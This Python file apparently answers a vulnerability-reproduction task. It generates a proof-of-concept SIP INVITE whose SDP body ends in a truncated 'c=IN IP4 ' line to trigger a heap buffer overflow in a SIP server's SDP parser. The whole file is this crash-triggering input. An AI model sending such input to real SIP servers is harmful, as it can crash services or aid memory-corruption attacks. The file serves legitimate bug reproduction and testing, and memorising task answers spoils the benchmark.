import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow vulnerability in core: parser/sdp.
        The vulnerability is caused by missing bounds checks when parsing certain SDP fields,
        specifically when looking for the end of a value or skipping whitespace.
        """
        
        # Construct SIP headers
        # We use a standard INVITE message to reach the SDP parser
        headers = [
            b"INVITE sip:poc@127.0.0.1 SIP/2.0",
            b"Via: SIP/2.0/UDP 127.0.0.1:5060;branch=z9hG4bK-poc",
            b"Max-Forwards: 70",
            b"From: <sip:poc@127.0.0.1>;tag=poc",
            b"To: <sip:target@127.0.0.1>",
            b"Call-ID: poc-callid",
            b"CSeq: 1 INVITE",
            b"Content-Type: application/sdp",
        ]

        # Construct Malformed SDP Body
        # The trigger is placed at the end of the body.
        # We use a 'c=' (connection) line which is commonly parsed using functions 
        # prone to this type of overflow (e.g., extract_mediaip).
        # ending with "c=IN IP4 " (with a trailing space) and no newline
        # attempts to force the parser to skip the space and read past the buffer end.
        sdp_lines = [
            b"v=0",
            b"o=poc 1234 5678 IN IP4 127.0.0.1",
            b"s=poc",
            b"t=0 0",
            b"m=audio 5000 RTP/AVP 0",
            b"c=IN IP4 "  # Trigger: truncated line with trailing space
        ]
        
        # Join with CRLF. Note that the last line will NOT have a CRLF appended by join
        # which is desired to make it the absolute end of the buffer.
        body = b"\r\n".join(sdp_lines)
        
        # Append Content-Length
        # Correct length is important so the parser knows the boundary 
        # (and potentially overflows it)
        headers.append(f"Content-Length: {len(body)}".encode())
        
        # Assemble full SIP message
        # Headers separated by CRLF, Body separated by double CRLF
        poc_data = b"\r\n".join(headers) + b"\r\n\r\n" + body
        
        return poc_data